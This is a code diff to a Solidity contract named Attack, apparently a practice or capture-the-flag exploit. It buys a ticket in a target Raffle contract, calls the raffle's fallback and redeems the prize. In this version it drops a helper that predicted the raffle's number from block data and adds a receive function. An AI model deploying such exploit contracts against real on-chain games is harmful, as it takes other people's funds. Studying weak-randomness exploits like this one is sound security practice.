@@ -8,7 +8,6 @@ contract Attack {
     uint magicNumber;
     address payable adr;
 
-
     constructor(address payable _addr) public payable {
         rf = Raffle(_addr);
         adr = _addr;
@@ -23,22 +22,18 @@ contract Attack {
         rf.buyRafflewTicket{value: 1 ether}(magicNumber);
         debug = 2;
 
-        //(bool success,) = address(rf).call(abi.encodeWithSignature("setter()"));
-
-        (bool success,) = adr.call{value: msg.value}("");
+        (bool success, ) = address(rf).call(abi.encodeWithSignature("fallback()"));
         require(success);
         debug = 3;
-    }
-
-    function getM() public view returns (uint) {
-        uint mn = uint256(keccak256(abi.encodePacked(block.number - 8, now))) % 19 + 1;
-        return mn;
     }
 
     function redeemPrize() public {
         rf.redeemPrize();
     }
+
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
+
+    receive() external payable {}
 }
